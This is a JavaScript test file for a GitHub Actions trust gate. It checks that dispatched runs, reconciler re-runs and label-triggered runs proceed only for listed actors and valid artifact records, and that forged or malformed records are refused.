test("dispatcher: a dispatched run still needs a listed PR author", async () => {
  const pull = fixture("api-pull-42.json");
  pull.user = STRANGER;
  const github = fakeGitHub({ ...dispatcherRoutes(), [pullRoute]: pull });
  assert.deepEqual(await dispatched({ github }), STOPPED("untrusted-author"));
});

test("dispatcher: a re-run of the dispatched lane run by a listed human proceeds", async () => {
  const github = fakeGitHub(dispatcherRoutes({ self: { run_attempt: 2, triggering_actor: KYLE } }));
  assert.deepEqual(await dispatched({ github, triggeringActor: "kyle-sexton" }), PROCEED);
});

test("dispatcher: a re-run of the dispatched lane run by an unlisted user stops", async () => {
  const github = fakeGitHub(
    dispatcherRoutes({ self: { run_attempt: 2, triggering_actor: STRANGER } }),
  );
  assert.deepEqual(
    await dispatched({ github, triggeringActor: "stranger" }),
    STOPPED("untrusted-rerunner"),
  );
});

test("dispatcher: a re-run of the dispatched lane run by github-actions[bot] stops", async () => {
  const github = fakeGitHub(
    dispatcherRoutes({ self: { run_attempt: 2, triggering_actor: ACTIONS_BOT } }),
  );
  assert.deepEqual(await dispatched({ github }), STOPPED("untrusted-rerunner"));
});

test("dispatcher: a re-run by a listed but denied human stops", async () => {
  const github = fakeGitHub(dispatcherRoutes({ self: { run_attempt: 2, triggering_actor: KYLE } }));
  assert.deepEqual(
    await dispatched({ github, triggeringActor: "kyle-sexton", deniedActorIds: "153232337" }),
    STOPPED("untrusted-rerunner"),
  );
});

test("dispatcher: the run id is ignored on a pull_request event", async () => {
  const github = fakeGitHub({});
  assert.deepEqual(
    await gate({
      eventName: "pull_request",
      event: fixture("event-pull-request.json"),
      github,
      dispatcherRunId: DISPATCHER_RUN_ID,
      dispatcherWorkflow: DISPATCHER_WORKFLOW,
      runId: SELF_RUN_ID,
    }),
    PROCEED,
  );
  assert.deepEqual(github.calls, [selfRoute]);
});

// The dispatcher run's record of the runs it dispatched

const artifactReads = (github) => github.calls.filter((call) => call === artifactsRoute).length;

test("dispatcher: recorded proceeds with no wait", async () => {
  const sleep = fakeSleep();
  const github = fakeGitHub(dispatcherRoutes());
  assert.deepEqual(await dispatched({ github, sleep }), PROCEED);
  assert.deepEqual(sleep.waits, []);
  assert.equal(artifactReads(github), 1);
});

test("dispatcher: recorded among several dispatched ids proceeds", async () => {
  const github = fakeGitHub(
    dispatcherRoutes({
      artifacts: listing(record({ name: `pr-unblock-dispatched-38155580000-${SELF_RUN_ID}-38155589999` })),
    }),
  );
  assert.deepEqual(await dispatched({ github }), PROCEED);
});

test("dispatcher: absent, then present on the 2nd read, proceeds after one sleep", async () => {
  const sleep = fakeSleep();
  const github = fakeGitHub(
    dispatcherRoutes({
      dispatcher: { status: "in_progress" },
      artifacts: inTurn(listing(), listing(record())),
    }),
  );
  assert.deepEqual(await dispatched({ github, sleep }), PROCEED);
  assert.deepEqual(sleep.waits, [5000]);
  assert.equal(artifactReads(github), 2);
});

test("dispatcher: status in_progress, then present at the artifact read, proceeds", async () => {
  const sleep = fakeSleep();
  const github = fakeGitHub(dispatcherRoutes({ dispatcher: { status: "in_progress" } }));
  assert.deepEqual(await dispatched({ github, sleep }), PROCEED);
  assert.deepEqual(sleep.waits, []);
});

test("dispatcher: absent at the first completed, found by the extra read, proceeds", async () => {
  const sleep = fakeSleep();
  const github = fakeGitHub(
    dispatcherRoutes({
      dispatcher: dispatcherIn("in_progress", "in_progress", "completed"),
      artifacts: inTurn(listing(), listing(), listing(record())),
    }),
  );
  assert.deepEqual(await dispatched({ github, sleep }), PROCEED);
  assert.deepEqual(sleep.waits, [5000, 5000]);
  assert.equal(artifactReads(github), 3);
  // The extra read after completed reads the artifacts only.
  assert.equal(github.calls.filter((call) => call === dispatcherRoute).length, 3);
});

test("dispatcher: absent at the first completed and at the extra read refuses after exactly one sleep", async () => {
  const sleep = fakeSleep();
  const github = fakeGitHub(
    dispatcherRoutes({ dispatcher: { status: "completed" }, artifacts: listing() }),
  );
  assert.deepEqual(await dispatched({ github, sleep }), STOPPED("untrusted-actor"));
  assert.deepEqual(sleep.waits, [5000]);
  assert.equal(artifactReads(github), 2);
});

test("dispatcher: absent on every in-progress read refuses after 24 sleeps", async () => {
  const sleep = fakeSleep();
  const github = fakeGitHub(
    dispatcherRoutes({ dispatcher: { status: "in_progress" }, artifacts: listing() }),
  );
  assert.deepEqual(await dispatched({ github, sleep }), STOPPED("untrusted-actor"));
  assert.deepEqual(sleep.waits, Array(24).fill(5000));
  assert.equal(artifactReads(github), 25);
});

test("dispatcher: completed at the last allowed read refuses with no wait past 2 min", async () => {
  const sleep = fakeSleep();
  const statuses = [...Array(25).fill("in_progress"), "completed"];
  const github = fakeGitHub(
    dispatcherRoutes({ dispatcher: dispatcherIn(...statuses), artifacts: listing() }),
  );
  assert.deepEqual(await dispatched({ github, sleep }), STOPPED("untrusted-actor"));
  assert.deepEqual(sleep.waits, Array(24).fill(5000));
});

test("dispatcher: an absent record logs the re-read with ids only", async (t) => {
  const log = t.mock.method(console, "log", () => {});
  const github = fakeGitHub(
    dispatcherRoutes({ dispatcher: { status: "completed" }, artifacts: listing() }),
  );
  assert.deepEqual(await dispatched({ github }), STOPPED("untrusted-actor"));
  assert.deepEqual(
    log.mock.calls.map((call) => call.arguments[0]),
    [
      `check-trusted-trigger: dispatcher record: absent, re-read 1 (dispatcher run ${DISPATCHER_RUN_ID}, run ${SELF_RUN_ID})`,
      "check-trusted-trigger: proceed=false reason=untrusted-actor",
    ],
  );
});

for (const [label, artifacts] of [
  ["the record has expired", listing(record({ expired: true }))],
  ["the record has no expired field", listing(record({ expired: undefined }))],
  ["the record belongs to another workflow_run.id", listing(record({ workflow_run: { ...RECORD.workflow_run, id: 38155572049 } }))],
  ["the record's workflow_run.id is a string", listing(record({ workflow_run: { ...RECORD.workflow_run, id: DISPATCHER_RUN_ID } }))],
  ["the record lists a prefix of this run's id", listing(record({ name: "pr-unblock-dispatched-3815558052" }))],
  ["the record lists this run's id with a digit more", listing(record({ name: "pr-unblock-dispatched-381555805290" }))],
  ["the record lists this run's id with a leading zero", listing(record({ name: "pr-unblock-dispatched-038155580529" }))],
  ["the record lists another run only", listing(record({ name: "pr-unblock-dispatched-38155580530" }))],
  ["the name has a trailing dash", listing(record({ name: `pr-unblock-dispatched-${SELF_RUN_ID}-` }))],
  ["the name has an empty id", listing(record({ name: `pr-unblock-dispatched--${SELF_RUN_ID}` }))],
  ["the name has another prefix", listing(record({ name: `xpr-unblock-dispatched-${SELF_RUN_ID}` }))],
  ["the name uses an underscore", listing(record({ name: `pr-unblock-dispatched_${SELF_RUN_ID}` }))],
  ["the name ends in a newline", listing(record({ name: `pr-unblock-dispatched-${SELF_RUN_ID}\n` }))],
  ["the name lists an id of 16 digits", listing(record({ name: `pr-unblock-dispatched-${SELF_RUN_ID}-1234567890123456` }))],
  ["the name is not a string", listing(record({ name: Number(SELF_RUN_ID) }))],
  ["the listing has no artifacts array", { total_count: 1 }],
  ["the listing is empty", listing()],
]) {
  test(`dispatcher: refused with untrusted-actor when ${label}`, async () => {
    const github = fakeGitHub(dispatcherRoutes({ dispatcher: { status: "completed" }, artifacts }));
    assert.deepEqual(await dispatched({ github }), STOPPED("untrusted-actor"));
  });
}

for (const status of [500, 502, 404]) {
  test(`dispatcher: an artifacts read failing with ${status} refuses with no wait`, async () => {
    const sleep = fakeSleep();
    const github = fakeGitHub(
      dispatcherRoutes({
        dispatcher: { status: "in_progress" },
        artifacts: new GitHubError(status, "artifacts"),
      }),
    );
    assert.deepEqual(await dispatched({ github, sleep }), STOPPED("untrusted-actor"));
    assert.deepEqual(sleep.waits, []);
  });
}

test("dispatcher: a dispatcher run read failing between record reads refuses", async () => {
  const sleep = fakeSleep();
  const run = { ...fixture("api-run-dispatcher.json"), status: "in_progress" };
  const github = fakeGitHub(
    dispatcherRoutes({
      dispatcher: inTurn(run, run, new GitHubError(502, "run")),
      artifacts: listing(),
    }),
  );
  assert.deepEqual(await dispatched({ github, sleep }), STOPPED("untrusted-actor"));
  assert.deepEqual(sleep.waits, [5000]);
});

test("dispatcher: a recorded run that fails the window check refuses before the record is read", async () => {
  const github = fakeGitHub(dispatcherRoutes({ self: { created_at: "2026-10-11T12:05:01Z" } }));
  assert.deepEqual(await dispatched({ github }), STOPPED("untrusted-actor"));
  assert.equal(artifactReads(github), 0);
});

test("dispatcher: a re-run attempt 2 by a listed human refuses once the record has expired", async () => {
  const github = fakeGitHub(
    dispatcherRoutes({
      dispatcher: { status: "completed" },
      self: { run_attempt: 2, triggering_actor: KYLE },
      artifacts: listing(record({ expired: true })),
    }),
  );
  assert.deepEqual(
    await dispatched({ github, triggeringActor: "kyle-sexton" }),
    STOPPED("untrusted-actor"),
  );
});

test("dispatcher: a listed human's own dispatch reads no record", async () => {
  const event = fixture("event-workflow-dispatch-dispatcher.json");
  event.sender = KYLE;
  const github = fakeGitHub(dispatcherRoutes({ artifacts: listing(), self: { triggering_actor: KYLE } }));
  assert.deepEqual(await dispatched({ github, event, triggeringActor: "kyle-sexton" }), PROCEED);
  assert.equal(artifactReads(github), 0);
});

// A lost lane run re-run by the lost-run reconciler: attempt 2, started by
// github-actions[bot], trusted only through the reconciler run's record
// reconcile-rerun-<run id>-2-<head sha>, uploaded before the re-run. Run and
// artifact shapes follow the recorded fixtures above.

const RECONCILER_WORKFLOW = ".github/workflows/maintenance-reconcile-lost-runs.yml";
const RECONCILER_RUN_ID = 39320000001;
const RECONCILER_HEAD = "7777777777777777777777777777777777777777";
const LOST_RUN_ID = "39310000002";
const LOST_HEAD = "6666666666666666666666666666666666666666";
const RERUN_RECORD = `reconcile-rerun-${LOST_RUN_ID}-2-${LOST_HEAD}`;
const attemptRoute = `GET /repos/${REPOSITORY}/actions/runs/${LOST_RUN_ID}/attempts/2`;
const rerunArtifactsRoute = `GET /repos/${REPOSITORY}/actions/artifacts?name=${RERUN_RECORD}&per_page=100&page=1`;
const reconcilerRoute = `GET /repos/${REPOSITORY}/actions/runs/${RECONCILER_RUN_ID}`;
const reconcilerCompare = `GET /repos/${REPOSITORY}/compare/${RECONCILER_HEAD}...${TIP_SHA}`;

const reconcilerRun = (overrides = {}) => ({
  id: RECONCILER_RUN_ID,
  name: "maintenance-reconcile-lost-runs",
  path: RECONCILER_WORKFLOW,
  event: "schedule",
  status: "in_progress",
  head_branch: "main",
  head_sha: RECONCILER_HEAD,
  run_attempt: 1,
  created_at: "2026-10-19T19:04:00Z",
  run_started_at: "2026-10-19T19:04:10Z",
  updated_at: "2026-10-19T19:04:50Z",
  actor: KYLE,
  triggering_actor: KYLE,
  repository: { id: 1, full_name: REPOSITORY },
  head_repository: { id: 1, full_name: REPOSITORY },
  ...overrides,
});
const lostAttempt = (overrides = {}) => ({
  id: Number(LOST_RUN_ID),
  name: "pr-verify",
  path: ".github/workflows/pr-verify.yml",
  event: "workflow_run",
  head_branch: "main",
  head_sha: LOST_HEAD,
  run_attempt: 2,
  created_at: "2026-10-19T18:40:00Z",
  run_started_at: "2026-10-19T19:04:45Z",
  actor: KYLE,
  triggering_actor: ACTIONS_BOT,
  repository: { id: 1, full_name: REPOSITORY },
  ...overrides,
});
const rerunRecord = (overrides = {}) => ({
  id: 11800000001,
  name: RERUN_RECORD,
  expired: false,
  created_at: "2026-10-19T19:04:40Z",
  updated_at: "2026-10-19T19:04:40Z",
  expires_at: "2026-10-20T19:04:39Z",
  workflow_run: {
    id: RECONCILER_RUN_ID,
    repository_id: 1,
    head_repository_id: 1,
    head_branch: "main",
    head_sha: RECONCILER_HEAD,
  },
  ...overrides,
});

// No tagRoute: the fake answers 404, so no tag shares the branch name.
function rerunRoutes({ attempt = {}, reconciler = {}, artifacts = listing(rerunRecord()), compare = { status: "ahead" }, extra = {} } = {}) {
  return {
    [commitPulls]: [fixture("api-pull-42.json")],
    [attemptRoute]: { ...lostAttempt(), ...attempt },
    [rerunArtifactsRoute]: artifacts,
    [reconcilerRoute]: typeof reconciler === "function" ? reconciler : reconcilerRun(reconciler),
    [tipRoute]: TIP_REF,
    [reconcilerCompare]: compare,
    ...extra,
  };
}

function rerunEvent() {
  const event = fixture("event-workflow-run.json");
  event.repository = { ...event.repository, default_branch: "main" };
  return event;
}

function reconcilerRerun({ github, event = rerunEvent(), eventName = "workflow_run", ...rest }) {
  return gate({
    eventName,
    event,
    github,
    triggeringActor: "github-actions[bot]",
    reconcilerWorkflow: RECONCILER_WORKFLOW,
    runId: LOST_RUN_ID,
    runAttempt: "2",
    ...rest,
  });
}

test("reconciler re-run: a valid record vouches for github-actions[bot] as re-runner", async () => {
  const github = fakeGitHub(rerunRoutes());
  assert.deepEqual(await reconcilerRerun({ github }), PROCEED);
  assert.ok(github.calls.includes(rerunArtifactsRoute));
  assert.ok(github.calls.includes(reconcilerCompare));
});

test("reconciler re-run: a valid record vouches on a pull_request lane too", async () => {
  const event = fixture("event-pull-request.json");
  event.repository = { ...event.repository, default_branch: "main" };
  const github = fakeGitHub(rerunRoutes({ attempt: { event: "pull_request", head_sha: LOST_HEAD } }));
  assert.deepEqual(await reconcilerRerun({ github, event, eventName: "pull_request" }), PROCEED);
});

test("reconciler re-run: a reconciler run a listed human dispatched vouches", async () => {
  const github = fakeGitHub(rerunRoutes({ reconciler: { event: "workflow_dispatch" } }));
  assert.deepEqual(await reconcilerRerun({ github }), PROCEED);
});

test("reconciler re-run: one valid record among forged ones of the same name vouches", async () => {
  const forged = rerunRecord({ id: 11800000009, workflow_run: { id: 39320000009, head_branch: "fix/x" } });
  const github = fakeGitHub(
    rerunRoutes({
      artifacts: listing(forged, rerunRecord()),
      extra: { [`GET /repos/${REPOSITORY}/actions/runs/39320000009`]: reconcilerRun({ id: 39320000009, event: "pull_request", head_branch: "fix/x" }) },
    }),
  );
  assert.deepEqual(await reconcilerRerun({ github }), PROCEED);
});

test("reconciler re-run: a forged record whose run cannot be read does not stop the check", async () => {
  // No route answers for run 39320000009, so its read fails.
  const forged = rerunRecord({ id: 11800000009, workflow_run: { id: 39320000009 } });
  const github = fakeGitHub(rerunRoutes({ artifacts: listing(forged, rerunRecord()) }));
  assert.deepEqual(await reconcilerRerun({ github }), PROCEED);
});

test("reconciler re-run: a valid record past a full page of forged ones vouches", async () => {
  const forged = Array.from({ length: 100 }, (_, i) => rerunRecord({ id: 11900000000 + i, expired: true }));
  const github = fakeGitHub(
    rerunRoutes({
      artifacts: { total_count: 101, artifacts: forged },
      extra: { [rerunArtifactsRoute.replace(/page=1$/, "page=2")]: { total_count: 101, artifacts: [rerunRecord()] } },
    }),
  );
  assert.deepEqual(await reconcilerRerun({ github }), PROCEED);
});

test("reconciler re-run: 21 forged candidates before the real record refuse after 20 run reads", async () => {
  const forgedIds = Array.from({ length: 21 }, (_, i) => 39330000000 + i);
  const forged = forgedIds.map((id, i) => rerunRecord({ id: 11900000000 + i, workflow_run: { id } }));
  const github = fakeGitHub(rerunRoutes({ artifacts: listing(...forged, rerunRecord()) }));
  assert.deepEqual(await reconcilerRerun({ github }), STOPPED("untrusted-rerunner"));
  const runReads = github.calls.filter((call) => /\/actions\/runs\/[0-9]+$/.test(call));
  assert.equal(runReads.length, 20);
  assert.ok(!github.calls.includes(reconcilerRoute));
});

test("reconciler re-run: with no record, github-actions[bot] stays an untrusted re-runner after one re-read", async () => {
  const sleep = fakeSleep();
  const github = fakeGitHub(rerunRoutes({ artifacts: listing() }));
  assert.deepEqual(await reconcilerRerun({ github, sleep }), STOPPED("untrusted-rerunner"));
  assert.equal(github.calls.filter((call) => call === rerunArtifactsRoute).length, 2);
  assert.deepEqual(sleep.waits, [5000]);
});

test("reconciler re-run: without reconciler-workflow the bot re-runner stops and no record is read", async () => {
  const github = fakeGitHub(rerunRoutes());
  assert.deepEqual(
    await reconcilerRerun({ github, reconcilerWorkflow: "" }),
    STOPPED("untrusted-rerunner"),
  );
  assert.deepEqual(github.calls, [commitPulls, `GET /repos/${REPOSITORY}/actions/runs/${LOST_RUN_ID}`]);
});

test("reconciler re-run: an unlisted re-runner with no record still stops", async () => {
  const github = fakeGitHub(rerunRoutes({ artifacts: listing() }));
  assert.deepEqual(
    await reconcilerRerun({ github, triggeringActor: "stranger" }),
    STOPPED("untrusted-rerunner"),
  );
  assert.ok(!github.calls.includes(rerunArtifactsRoute));
});

test("reconciler re-run: a record does not vouch for an unlisted PR author", async () => {
  const pull = fixture("api-pull-42.json");
  pull.user = STRANGER;
  const github = fakeGitHub({ ...rerunRoutes(), [commitPulls]: [pull] });
  assert.deepEqual(await reconcilerRerun({ github }), STOPPED("untrusted-author"));
});

test("reconciler re-run: a record does not vouch for an unlisted upstream actor", async () => {
  const event = rerunEvent();
  event.workflow_run.actor = STRANGER;
  const github = fakeGitHub(rerunRoutes());
  assert.deepEqual(await reconcilerRerun({ github, event }), STOPPED("untrusted-actor"));
  assert.ok(!github.calls.includes(rerunArtifactsRoute));
});

for (const runAttempt of ["1", "3", ""]) {
  test(`reconciler re-run: attempt ${runAttempt || "(none)"} is never vouched for and nothing is read`, async () => {
    const github = fakeGitHub(rerunRoutes());
    assert.deepEqual(await reconcilerRerun({ github, runAttempt }), STOPPED("untrusted-rerunner"));
    assert.deepEqual(github.calls, [commitPulls]);
  });
}

test("reconciler re-run: a denied github-actions[bot] stops before any record read", async () => {
  const github = fakeGitHub(rerunRoutes());
  assert.deepEqual(
    await reconcilerRerun({ github, deniedActorIds: "41898282" }),
    STOPPED("untrusted-rerunner"),
  );
  assert.ok(!github.calls.includes(rerunArtifactsRoute));
});

for (const [label, attempt] of [
  ["the attempt was started by someone else", { triggering_actor: KYLE }],
  ["the attempt names another run", { id: 39310000003 }],
  ["the attempt is another attempt", { run_attempt: 3 }],
  ["the attempt belongs to another repository", { repository: { id: 2, full_name: "stranger/claude-code-plugins" } }],
  ["the attempt has no head SHA", { head_sha: "main" }],
  ["the attempt started before the reconciler run", { run_started_at: "2026-10-19T19:04:09Z" }],
  ["the attempt started more than ten minutes after the reconciler run", { run_started_at: "2026-10-19T19:14:11Z" }],
  ["the attempt started before the record was written", { run_started_at: "2026-10-19T19:04:39Z" }],
]) {
  test(`reconciler re-run: refused when ${label}`, async () => {
    const github = fakeGitHub(rerunRoutes({ attempt }));
    assert.deepEqual(await reconcilerRerun({ github }), STOPPED("untrusted-rerunner"));
  });
}

test("reconciler re-run: a record naming another run or another head does not vouch", async () => {
  // The listing for this run's name is empty; records for other names exist.
  const others = {
    [`GET /repos/${REPOSITORY}/actions/artifacts?name=reconcile-rerun-39310000099-2-${LOST_HEAD}&per_page=100&page=1`]: listing(rerunRecord({ name: `reconcile-rerun-39310000099-2-${LOST_HEAD}` })),
    [`GET /repos/${REPOSITORY}/actions/artifacts?name=reconcile-rerun-${LOST_RUN_ID}-2-${HEAD_SHA}&per_page=100&page=1`]: listing(rerunRecord({ name: `reconcile-rerun-${LOST_RUN_ID}-2-${HEAD_SHA}` })),
  };
  const github = fakeGitHub(rerunRoutes({ artifacts: listing(), extra: others }));
  assert.deepEqual(await reconcilerRerun({ github }), STOPPED("untrusted-rerunner"));
});

for (const [label, artifacts] of [
  ["the listed artifact has another name", listing(rerunRecord({ name: `reconcile-rerun-39310000099-2-${LOST_HEAD}` }))],
  ["the record has expired", listing(rerunRecord({ expired: true }))],
  ["the record has no run id", listing(rerunRecord({ workflow_run: null }))],
  ["the record was written after the re-run started", listing(rerunRecord({ created_at: "2026-10-19T19:04:46Z" }))],
  ["the listing has no artifacts array", { total_count: 1 }],
]) {
  test(`reconciler re-run: refused when ${label}`, async () => {
    const github = fakeGitHub(rerunRoutes({ artifacts }));
    assert.deepEqual(await reconcilerRerun({ github }), STOPPED("untrusted-rerunner"));
  });
}

for (const [label, reconciler] of [
  ["the recording run is another workflow", { path: ".github/workflows/pr-merge.yml" }],
  ["the recording run is a PR branch's run", { event: "pull_request", head_branch: "fix/forge" }],
  ["the recording run is a dispatch on a PR branch", { event: "workflow_dispatch", head_branch: "fix/forge" }],
  ["the recording run is a push run", { event: "push" }],
  ["the recording run is in another repository", { repository: { id: 2, full_name: "stranger/claude-code-plugins" } }],
  ["the recording run was dispatched by an unlisted user", { event: "workflow_dispatch", actor: STRANGER }],
  ["the recording run was re-run by an unlisted user", { run_attempt: 2, triggering_actor: STRANGER }],
  ["the recording run reports another id", { id: 39320000002 }],
  ["the recording run's head is not a SHA", { head_sha: "main" }],
  ["the recording run started after the attempt", { run_started_at: "2026-10-19T19:04:46Z" }],
]) {
  test(`reconciler re-run: refused when ${label}`, async () => {
    const github = fakeGitHub(rerunRoutes({ reconciler }));
    assert.deepEqual(await reconcilerRerun({ github }), STOPPED("untrusted-rerunner"));
  });
}

test("reconciler re-run: a recording run not on the default branch's history does not vouch", async () => {
  const github = fakeGitHub(rerunRoutes({ compare: { status: "diverged" } }));
  assert.deepEqual(await reconcilerRerun({ github }), STOPPED("untrusted-rerunner"));
});

test("reconciler re-run: a tag sharing the default branch name does not vouch", async () => {
  const github = fakeGitHub({ ...rerunRoutes(), [tagRoute]: { ref: "refs/tags/main" } });
  assert.deepEqual(await reconcilerRerun({ github }), STOPPED("untrusted-rerunner"));
});

test("reconciler re-run: a payload without the default branch stops with untrusted-base", async () => {
  const event = rerunEvent();
  delete event.repository.default_branch;
  const github = fakeGitHub(rerunRoutes());
  assert.deepEqual(await reconcilerRerun({ github, event }), STOPPED("untrusted-base"));
});

test("reconciler re-run: a failed attempt read refuses", async () => {
  const github = fakeGitHub(rerunRoutes({ attempt: undefined, extra: { [attemptRoute]: new GitHubError(502, "attempt") } }));
  assert.deepEqual(await reconcilerRerun({ github }), STOPPED("untrusted-rerunner"));
});

// actor-only mode (require-pr: false)

const ACTORS_OK = { ...STOPPED("ok"), proceed: "true" };

function actorOnly({ eventName = "workflow_dispatch", event, ...rest }) {
  const github = fakeGitHub({});
  return gate({
    eventName,
    event: event ?? { sender: KYLE, repository: { full_name: REPOSITORY } },
    github,
    requirePr: "false",
    ...rest,
  }).then((outputs) => ({ outputs, calls: github.calls }));
}

test("actor-only: a listed sender and triggering actor on workflow_dispatch proceed without a PR", async () => {
  assert.deepEqual(await actorOnly({}), { outputs: ACTORS_OK, calls: [OWN_ROUTE] });
});

test("actor-only: an unlisted workflow_dispatch sender stops with untrusted-actor", async () => {
  const { outputs } = await actorOnly({ event: { sender: STRANGER } });
  assert.deepEqual(outputs, STOPPED("untrusted-actor"));
});

test("actor-only: a denied workflow_dispatch sender stops with bot-actor", async () => {
  const { outputs } = await actorOnly({ deniedActorIds: "153232337" });
  assert.deepEqual(outputs, STOPPED("bot-actor"));
});

test("actor-only: an unlisted triggering actor on workflow_dispatch stops", async () => {
  const { outputs } = await actorOnly({ triggeringActor: "stranger" });
  assert.deepEqual(outputs, STOPPED("untrusted-rerunner"));
});

test("actor-only: a push checks only the triggering actor", async () => {
  const { outputs, calls } = await actorOnly({
    eventName: "push",
    event: { sender: STRANGER },
    triggeringActor: "kyle-sexton",
  });
  assert.deepEqual(outputs, ACTORS_OK);
  assert.deepEqual(calls, [OWN_ROUTE]);
});

test("actor-only: a push with an unlisted triggering actor stops", async () => {
  const { outputs } = await actorOnly({
    eventName: "push",
    event: { sender: KYLE },
    triggeringActor: "github-merge-queue[bot]",
  });
  assert.deepEqual(outputs, STOPPED("untrusted-rerunner"));
});

test("actor-only: a push with a denied triggering actor stops", async () => {
  const { outputs } = await actorOnly({ eventName: "push", deniedActorIds: "153232337" });
  assert.deepEqual(outputs, STOPPED("untrusted-rerunner"));
});

test("actor-only: a pr-number is not read", async () => {
  const { outputs, calls } = await actorOnly({ prNumber: "42" });
  assert.deepEqual(outputs, ACTORS_OK);
  assert.deepEqual(calls, [OWN_ROUTE]);
});

for (const eventName of ["pull_request", "workflow_run", "schedule"]) {
  test(`actor-only: a ${eventName} event stops with no-pr`, async () => {
    const { outputs } = await actorOnly({ eventName });
    assert.deepEqual(outputs, STOPPED("no-pr"));
  });
}

// An issues event: the sender is the account that applied the label.
test("actor-only: an issues label from a listed human proceeds without a PR", async () => {
  const { outputs, calls } = await actorOnly({ eventName: "issues", requireKind: "human" });
  assert.deepEqual(outputs, ACTORS_OK);
  assert.deepEqual(calls, [OWN_ROUTE]);
});

test("actor-only: an issues label from an unlisted sender stops with untrusted-actor", async () => {
  const { outputs } = await actorOnly({ eventName: "issues", event: { sender: STRANGER } });
  assert.deepEqual(outputs, STOPPED("untrusted-actor"));
});

test("actor-only: an issues label from a denied sender stops with bot-actor", async () => {
  const { outputs } = await actorOnly({ eventName: "issues", deniedActorIds: "153232337" });
  assert.deepEqual(outputs, STOPPED("bot-actor"));
});

const LISTED_BOT = { login: "claude[bot]", id: 209825114, type: "Bot" };

test("require-kind: human refuses an issues label applied by a listed bot", async () => {
  const { outputs } = await actorOnly({ eventName: "issues", event: { sender: LISTED_BOT }, requireKind: "human" });
  assert.deepEqual(outputs, STOPPED("untrusted-actor"));
});

test("require-kind: empty keeps a listed bot sender acceptable in actor-only mode", async () => {
  const { outputs } = await actorOnly({
    event: { sender: LISTED_BOT },
    triggeringActor: "claude[bot]",
    requireKind: "",
  });
  assert.deepEqual(outputs, ACTORS_OK);
});

test("require-kind: human accepts a listed human sender and triggering actor", async () => {
  const { outputs } = await actorOnly({ requireKind: "human" });
  assert.deepEqual(outputs, ACTORS_OK);
});

test("require-kind: human refuses a listed bot sender with untrusted-actor", async () => {
  const { outputs } = await actorOnly({ event: { sender: LISTED_BOT }, requireKind: "human" });
  assert.deepEqual(outputs, STOPPED("untrusted-actor"));
});

test("require-kind: human refuses a listed bot triggering actor with untrusted-rerunner", async () => {
  const { outputs } = await actorOnly({ triggeringActor: "claude[bot]", requireKind: "human" });
  assert.deepEqual(outputs, STOPPED("untrusted-rerunner"));
});

test("require-kind: human refuses a listed bot re-runner of a push", async () => {
  const { outputs } = await actorOnly({
    eventName: "push",
    triggeringActor: "claude[bot]",
    requireKind: "human",
  });
  assert.deepEqual(outputs, STOPPED("untrusted-rerunner"));
});

test("require-kind: a value other than empty or human stops with no-pr", async () => {
  const { outputs } = await actorOnly({ requireKind: "bot" });
  assert.deepEqual(outputs, STOPPED("no-pr"));
});

// app-label: the lanes App may apply that one label in issue mode, and the
// label alone admits the issue: no comment or edit history is read.
const LANES_APP = { login: "melodic-automation-lanes[bot]", id: 337595936, type: "Bot" };

function appLabel({ label = "agent-ready", action = "labeled", sender = LANES_APP, eventName = "issues", ...rest } = {}) {
  const github = fakeGitHub({});
  return gate({
    eventName,
    event: { action, label: { name: label }, issue: { number: 7 }, sender, repository: { full_name: REPOSITORY } },
    github,
    requirePr: "false",
    requireKind: "human",
    deniedActorIds: "337595936",
    lanesAppId: "337595936",
    appLabel: "agent-ready",
    triggeringActor: "melodic-automation-lanes[bot]",
    ...rest,
  }).then((outputs) => ({ outputs, calls: github.calls }));
}

test("app-label: the App's agent-ready label proceeds on the label alone and reads only its own run", async () => {
  const { outputs, calls } = await appLabel();
  assert.deepEqual(outputs, ACTORS_OK);
  assert.deepEqual(calls, [OWN_ROUTE]);
});

test("app-label: a listed human re-running the App's run proceeds", async () => {
  const { outputs } = await appLabel({ triggeringActor: "kyle-sexton" });
  assert.deepEqual(outputs, ACTORS_OK);
});

test("app-label: a denied human re-running the App's run stops with untrusted-rerunner", async () => {
  const { outputs } = await appLabel({ deniedActorIds: "337595936 153232337", triggeringActor: "kyle-sexton" });
  assert.deepEqual(outputs, STOPPED("untrusted-rerunner"));
});

test("app-label: an event with no issue number stops with untrusted-actor", async () => {
  const { outputs } = await appLabel({ event: { action: "labeled", label: { name: "agent-ready" }, issue: {}, sender: LANES_APP } });
  assert.deepEqual(outputs, STOPPED("untrusted-actor"));
});

test("app-label:the App applying any other label stops with bot-actor and reads nothing", async () => {
  const { outputs, calls } = await appLabel({ label: "needs-human" });
  assert.deepEqual(outputs, STOPPED("bot-actor"));
  assert.deepEqual(calls, []);
});

test("app-label:an App issues event other than labeled stops with bot-actor", async () => {
  const { outputs, calls } = await appLabel({ action: "unlabeled" });
  assert.deepEqual(outputs, STOPPED("bot-actor"));
  assert.deepEqual(calls, []);
});

test("app-label:unset, the App's agent-ready label still stops with bot-actor", async () => {
  const { outputs, calls } = await appLabel({ appLabel: "" });
  assert.deepEqual(outputs, STOPPED("bot-actor"));
  assert.deepEqual(calls, []);
});

test("app-label:an unlisted re-runner of the App's run stops with untrusted-rerunner", async () => {
  const { outputs } = await appLabel({ triggeringActor: "stranger" });
  assert.deepEqual(outputs, STOPPED("untrusted-rerunner"));
});

test("app-label:a listed bot re-runner of the App's run stops with untrusted-rerunner", async () => {
  const { outputs } = await appLabel({ triggeringActor: "claude[bot]" });
  assert.deepEqual(outputs, STOPPED("untrusted-rerunner"));
});

test("app-label:another listed bot applying agent-ready still stops with untrusted-actor", async () => {
  const { outputs, calls } = await appLabel({ sender: LISTED_BOT, triggeringActor: "claude[bot]" });
  assert.deepEqual(outputs, STOPPED("untrusted-actor"));
  assert.deepEqual(calls, []);
});

test("app-label:a human's agent-ready label proceeds as before", async () => {
  const { outputs, calls } = await appLabel({ sender: KYLE, triggeringActor: "kyle-sexton" });
  assert.deepEqual(outputs, ACTORS_OK);
  assert.deepEqual(calls, [OWN_ROUTE]);
});

test("app-label:outside issues, the App sender still stops with bot-actor", async () => {
  const { outputs, calls } = await appLabel({ eventName: "workflow_dispatch" });
  assert.deepEqual(outputs, STOPPED("bot-actor"));
  assert.deepEqual(calls, []);
});

test("require-pr: a value other than true or false stops with no-pr, even for a valid PR", async () => {
  const github = fakeGitHub({ [pullRoute]: fixture("api-pull-42.json") });
  assert.deepEqual(
    await gate({
      eventName: "workflow_dispatch",
      event: fixture("event-workflow-dispatch.json"),
      github,
      prNumber: "42",
      requirePr: "no",
    }),
    STOPPED("no-pr"),
  );
});

test("require-pr: true keeps today's PR rules", async () => {
